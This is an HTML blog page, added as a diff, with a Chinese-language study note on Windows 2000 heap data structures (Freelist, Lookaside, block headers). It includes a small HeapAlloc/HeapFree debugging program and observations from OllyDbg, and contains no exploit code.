@@ -1,0 +1,1987 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>windows2000 堆溢出 | Deutschball&#39;s blog</title>
+
+  <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/DeutschBall/test/master/emp.png">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://cdn.jsdelivr.net/gh/inkss/fontawesome@5.15.3/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+    <script>
+        var themeModelId = '';
+        if (themeModelId) {
+            localStorage.setItem('modelId', themeModelId);
+        }
+    </script>
+    
+    <script src="https://cdn.jsdelivr.net/gh/yuang01/live2d-widget@latest/autoload.js"></script>
+    <script>
+        var live2dOpen = eval('true') || false;
+        if (!live2dOpen) {
+            localStorage.setItem('waifu-display', 1609323474481);
+        }
+    </script>
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+        <script src="/js/valine/av-min@3.0.4.js"></script>
+        <script src="https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js"></script>
+    
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head>
+
+  
+  <!-- 依赖于jquery和vue -->
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+
+  
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/vue@2.6.11/dist/vue.min.js"></script>
+
+  
+  
+  <body>
+    <!-- 预加载动画 -->
+    <!-- 页面预加载动画 -->
+
+<div id='loader'>
+  <link rel="stylesheet" href="/js/loaded/index.css" >
+  <div class="loading-left-bg"></div>
+  <div class="loading-right-bg"></div>
+  <div class="spinner-box">
+    <div class="configure-border-1">
+      <div class="configure-core"></div>
+    </div>
+    <div class="configure-border-2">
+      <div class="configure-core"></div>
+    </div>
+    <div class="loading-word">loading...</div>
+  </div>
+</div>
+
+<script>
+  var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('DOMContentLoaded',endLoading);
+  
+</script>
+
+    
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('true');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (href, before, media, attributes) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header   " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo lazyload placeholder" src="https://raw.githubusercontent.com/DeutschBall/test/master/emp.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/test/master/emp.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="logo">
+      <h3 class="drawer-box-head_title">Deutschball&#39;s blog</h3>
+      <h5 class="drawer-box-head_desc"></h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/DeutschBall">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="https://raw.githubusercontent.com/DeutschBall/test/master/emp.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/test/master/emp.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">Deutschball&#39;s blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">Search</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="Please enter keywords"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/DeutschBall" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+ <!-- prismjs 代码高亮 -->
+ 
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('/medias/1.jpg')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        windows2000 堆溢出
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> Published in：2022-09-20 |
+        </span>
+      
+
+      
+
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="row justify-position" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="windows堆"><a href="#windows堆" class="headerlink" title="windows堆"></a>windows堆</h1><h2 id="堆数据结构"><a href="#堆数据结构" class="headerlink" title="堆数据结构"></a>堆数据结构</h2><p>windows的堆由堆块和堆表组成</p>
+<p>堆表:一般位于堆区的起始位置,用于索引所有堆块,包括堆块位置,大小,是否空闲</p>
+<p>堆块:性能原因,一般分为大小不同的块.每个堆块都分为两部分,块首和块身.其中块首包含了描述本堆块的信息,包括大小,是否空闲等.块身紧跟在块首后面</p>
+<p>申请堆空间的函数比如malloc,new等,其返回的地址是块身起始地址</p>
+<p>占用的堆块被使用它的程序索引.空闲的堆块被堆表索引</p>
+<h3 id="堆表数据结构"><a href="#堆表数据结构" class="headerlink" title="堆表数据结构"></a>堆表数据结构</h3><p>空闲双向链表<code>Freelist</code>,空表</p>
+<p>快速单向链表<code>Lookaside</code>,快表</p>
+<h3 id="Freelist"><a href="#Freelist" class="headerlink" title="Freelist"></a>Freelist</h3><p>空闲堆块的块首有两个指针,用于将多个堆块链接成双向链表</p>
+<p>堆表区有一个128项的指针数组,空表索引画在图上就长这样</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919081803916.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919081803916.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919081803916"></p>
+<p>每个空表索引后面拉着一溜全都是一样大小的堆块</p>
+<p>空表索引<code>free[n]</code>后面拉着的堆块大小都是$n\times 8\ byte$</p>
+<p>特别的是<code>free[0]</code>,其中的堆块都是<code>1024</code>以上的,并且按照大小不降拉溜</p>
+<p>空表索引就是包含<strong>两个指针的结构体</strong>,两个指针分别指向拉溜的头和腚.</p>
+<p>相当于</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FreeListIndex</span>&#123;</span></span><br><span class="line">	FreelistNode * first;</span><br><span class="line">	FreelistNode * last;</span><br><span class="line">&#125;FreeList[<span class="number">128</span>];</span><br></pre></td></tr></table></figure>
+<p>意思意思就行了</p>
+<h3 id="Lookaside"><a href="#Lookaside" class="headerlink" title="Lookaside"></a>Lookaside</h3><p>块表用来加速堆分配,块表是单向链表,不会发生堆块合并</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919082249956.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919082249956.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919082249956"></p>
+<p>每个lookaside[n]节点,<strong>后面最多拉4个节点</strong></p>
+<p>后面最多拉4个节点,后面最多拉4个节点,后面最多拉4个节点</p>
+<h2 id="堆操作"><a href="#堆操作" class="headerlink" title="堆操作"></a>堆操作</h2><p>对操作分为堆块分配,堆块释放,堆块合并</p>
+<p>其中分配释放是程序员在程序中规定的,堆块合并由数据结构自己管理</p>
+<h3 id="堆块分配"><a href="#堆块分配" class="headerlink" title="堆块分配"></a>堆块分配</h3><p>快表分配,普通空表分配,0号空表分配</p>
+<h4 id="快表分配"><a href="#快表分配" class="headerlink" title="快表分配"></a>快表分配</h4><p>1.找到大小匹配的空闲堆块</p>
+<p>2.将该堆块的状态修改为占用</p>
+<p>3.从堆表中把他卸下,也就是其前驱指向其后继</p>
+<p>4.返回堆块块身首地址给程序指针托管</p>
+<h4 id="普通空表分配"><a href="#普通空表分配" class="headerlink" title="普通空表分配"></a>普通空表分配</h4><p>寻找能够满足空间要求的最小堆块</p>
+<h4 id="零号空表分配"><a href="#零号空表分配" class="headerlink" title="零号空表分配"></a>零号空表分配</h4><p>对于希望分配的空间大小x,首先反向搜索最后一个零号堆块,由于零号空表只增不减,最后一个零号堆块是最大的,如果最大的堆块没有x大,则零号空表分配失败</p>
+<p>否则从头开始寻找第一个可以容纳x的堆块</p>
+<h4 id="空表找零钱现象"><a href="#空表找零钱现象" class="headerlink" title="空表找零钱现象"></a>空表找零钱现象</h4><p>如果没有精确匹配希望分配空间大小的堆块,则拿一个大堆块,精确割出需要的空间大小,然后剩下的重新标注块首链接到空表中</p>
+<p>快表只有精确匹配时才会分配,不会发生找零钱现象</p>
+<h3 id="堆块释放"><a href="#堆块释放" class="headerlink" title="堆块释放"></a>堆块释放</h3><p>1.修改堆块状态为空闲</p>
+<p>2.堆块重新连入堆表末尾</p>
+<h3 id="堆块合并"><a href="#堆块合并" class="headerlink" title="堆块合并"></a>堆块合并</h3><p>将两个块从<strong>空表</strong>卸下,合并堆块,合并块首信息,然后将该堆块重新连入空闲链表</p>
+<p>快表中的空闲块都会被设置为占用状态,不参与堆块合并</p>
+<h4 id="内存紧缩"><a href="#内存紧缩" class="headerlink" title="内存紧缩"></a>内存紧缩</h4><p><img src="../AppData/Roaming/Typora/typora-user-images/image-20220919092345723.png" class="lazyload placeholder" data-srcset="../AppData/Roaming/Typora/typora-user-images/image-20220919092345723.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919092345723"></p>
+<h3 id="堆分配释放算法"><a href="#堆分配释放算法" class="headerlink" title="堆分配释放算法"></a>堆分配释放算法</h3><p><img src="../AppData/Roaming/Typora/typora-user-images/image-20220919092818744.png" class="lazyload placeholder" data-srcset="../AppData/Roaming/Typora/typora-user-images/image-20220919092818744.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919092818744"></p>
+<p>下面调试验证上述数据结构和操作</p>
+<h2 id="堆调试"><a href="#堆调试" class="headerlink" title="堆调试"></a>堆调试</h2><p>书上调试的程序长这样</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1,h2,h3,h4,h5,h6;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">5</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">6</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">19</span>);</span><br><span class="line">	h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//free block and prevent coaleses</span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//free to freelist[2] </span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3); <span class="comment">//free to freelist[2] </span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//free to freelist[4]</span></span><br><span class="line">	</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h4); <span class="comment">//coalese h3,h4,h5,link the large block to freelist[8]</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>第七行用int 3指令下断点让程序停下,从这里附加调试器,因为如果直接从头调试运行的话,堆会装孙子,不使用快表</p>
+<p>首先要了解一下这几个API的作用</p>
+<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><h4 id="HeapCreate"><a href="#HeapCreate" class="headerlink" title="HeapCreate"></a>HeapCreate</h4><p>在进程地址空间中创建辅助堆</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">HeapCreate</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] DWORD  flOptions,<span class="comment">//堆上的操作类型,包括读写执行等</span></span></span><br><span class="line"><span class="params">  [in] SIZE_T dwInitialSize,<span class="comment">//开始时分配给堆的字节数</span></span></span><br><span class="line"><span class="params">  [in] SIZE_T dwMaximumSize<span class="comment">//堆最大的字节数,0则表示无上限</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+<p>返回值是该堆空间的句柄,也就是基地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br></pre></td></tr></table></figure>
+<p>这样用的意思是,没有访问限制,初始时分给0x1000字节的堆空间,最大可以要0x10000字节的堆空间,将该堆空间的句柄交给hp变量保管</p>
+<h4 id="HeapAlloc"><a href="#HeapAlloc" class="headerlink" title="HeapAlloc"></a>HeapAlloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DECLSPEC_ALLOCATOR LPVOID <span class="title function_">HeapAlloc</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HANDLE hHeap,</span></span><br><span class="line"><span class="params">  [in] DWORD  dwFlags,</span></span><br><span class="line"><span class="params">  [in] SIZE_T dwBytes</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+<p>hHeap是堆空间的句柄,可以是HeapCreate或者GetProcessHeap的返回值</p>
+<p>其中HeapCreate是我们手动申请的堆空间,GetProcessHeap是进程堆空间,这个在程序运行开始就有了</p>
+<p>如果函数调用成功则返回申请空间的基地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
+<p>这样用的意思是,从刚才HeapCreate创建的堆空间中要一块3字节的空间,该块空间将会被初始化为0</p>
+<h4 id="HeapFree"><a href="#HeapFree" class="headerlink" title="HeapFree"></a>HeapFree</h4><p>释放HeapAlloc或者HeapReAlloc申请的堆空间</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">HeapFree</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HANDLE                 hHeap,</span></span><br><span class="line"><span class="params">  [in] DWORD                  dwFlags,</span></span><br><span class="line"><span class="params">  [in] _Frees_ptr_opt_ LPVOID lpMem</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HeapFree(hp,<span class="number">0</span>,h1);</span><br></pre></td></tr></table></figure>
+<p>将h1这一小块还给hp</p>
+<h3 id="哪一块是堆"><a href="#哪一块是堆" class="headerlink" title="哪一块是堆?"></a>哪一块是堆?</h3><p>ollydbg起来实时调试时,程序是停在0x40101D这个地方的</p>
+<p>在反汇编视图上INT3发生于调用HeapCreate函数之后</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919171320225.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919171320225.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919171320225"></p>
+<p>显然此时EAX就存放的HeapCreate的返回值,即hp句柄,也就是申请的堆空间的基地址0x390000,显然是一个用户地址空间的值</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919171420641.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919171420641.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919171420641"></p>
+<p>在内存界面上它长这样</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919171519939.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919171519939.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220919171519939"></p>
+<p>大小0x1000是我们给CreateHeap指定的初始值</p>
+<p>双击该地址到内存视图看看</p>
+<p>从0x390000开始,堆表中一次是段表索引,虚表索引,空表使用标识,空表索引区</p>
+<h3 id="堆块结构"><a href="#堆块结构" class="headerlink" title="堆块结构"></a>堆块结构</h3><p><img src="WPS图片拼图.png" class="lazyload placeholder" data-srcset="WPS图片拼图.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="WPS图片拼图"></p>
+<p>两者的区别主要在于[8,16)字节,由于占用态的堆块已经从空闲链表中取下,因此不需要再维护前后指针</p>
+<p>空闲态堆块尚未填充数据,因此这两个字节分别用于前后指针</p>
+<p>当占用态的堆块要归还的时候,这两个字节又得存放指针</p>
+<p>调试时,0x390688这里是Flink in freelist的位置,而真正的堆块起始位置应该在往前8个字节,即0x390680位置</p>
+<p>一般引用堆块的指针都是会越过8字节的头部</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919192556999.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919192556999.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="尾块头部"></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>块首属性</th>
+<th>值</th>
+<th>意义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Self Size</td>
+<td>0x130</td>
+<td>该尾块的data区大小<code>0x130*8=0x980</code>字节<br />注意单位是8字节,并且这0x980是包括堆块头部的</td>
+</tr>
+<tr>
+<td>Previous chunk</td>
+<td>0x80</td>
+<td></td>
+</tr>
+<tr>
+<td>Segment</td>
+<td>0</td>
+<td></td>
+</tr>
+<tr>
+<td>Flags</td>
+<td>0x10</td>
+<td></td>
+</tr>
+<tr>
+<td>Unused bytes</td>
+<td>0</td>
+<td></td>
+</tr>
+<tr>
+<td>Tag Index</td>
+<td>0</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>Flink in freelist和Blink in freelist此时都是指向Freelist[0]这个索引项的</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919184326162.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919184326162.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="Freelist[0]"></p>
+<p>左手拉右手,右手拽左手</p>
+<p>然后后面全都是0,因为尚未使用</p>
+<p>堆块的行为</p>
+<p>1.堆块大小包括了块块首,申请32字节,实际分配堆块40字节,前8字节是堆块首.返回的指针指向第9字节(下标8)</p>
+<p>2.堆块的单位是8字节,不足八字节的按照八字节分配</p>
+<p>3.初始状态下快表和空表都是空,只有一个Freelist[0]后面拉着一个尾块,这个尾块在堆偏移0x688处</p>
+<p>4.分配的时候从尾块头上(整个尾块包括尾块首都得换地方)开始切,切走之后要修改尾块块首的Self Size信息,并且将新的尾块data地址交给freelist[0]</p>
